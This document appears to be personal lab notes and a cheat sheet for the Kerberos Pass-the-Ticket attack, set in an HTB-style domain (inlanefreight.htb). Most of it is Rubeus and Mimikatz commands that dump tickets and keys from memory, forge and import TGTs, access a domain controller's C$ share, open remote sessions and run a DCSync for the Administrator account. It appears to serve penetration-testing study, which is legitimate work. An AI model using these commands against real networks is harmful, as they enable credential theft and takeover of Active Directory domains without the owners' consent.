# Pass-the-Ticket (PtT) 

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It can be:
- Service Ticket (TGS) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
## Extract Tickets

 With Mimikatz
```powershell 
# list tickets:
.\Rubeus.exe triage

# dump only TGTs
.\Rubeus.exe dump /service:krbtgt
.\Rubeus.exe dump /luid:<service luid> /service:krbtgt

# with mimikatz
mimikatz.exe sekurlsa::tickets /export

# dump all tickets
Rubeus.exe dump /nowrap

```

 importing a TGT  to our session Rubeas + mimikatz
```powershell
 .\Rubeus.exe ptt /ticket:b64<SNIP>

# Import a ticket kirbi file 
.\Rubeus.exe ptt /ticket:<filename.kirbi>

.\Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# Convert `.kirbi` → Base64
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

# confirm its cached/imported
 klist

# Import a kiribi ticket using Mimikatz
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

→ Ticket successfully imported, access shares:
```cmd
dir \\DC01.inlanefreight.htb\c$
```
---

# Cheat Sheet

- **Dump tickets (Mimikatz):** `sekurlsa::tickets /export`  
- **Dump tickets (Rubeus):** `Rubeus.exe dump /nowrap`  
- **Dump keys:** `sekurlsa::ekeys`  
- **Forge TGT (Mimikatz):** `sekurlsa::pth /domain:<dom> /user:<u> /ntlm:<hash>`  
- **Forge TGT (Rubeus):** `Rubeus.exe asktgt /domain:<dom> /user:<u> /aes256:<key>`  
- **Import ticket (Mimikatz):** `kerberos::ptt <ticket.kirbi>`  
- **Import ticket (Rubeus):** `Rubeus.exe ptt /ticket:<kirbi>` or `/ticket:<b64>`  
- **Remote session:** `Enter-PSSession -ComputerName <host>`
#### bonus

dcsync domain Administrator user with kerberos authentication /using our imported TGT
```powershell-session
lsadump::dcsync /user:INLANEFREIGHT\administrator
```

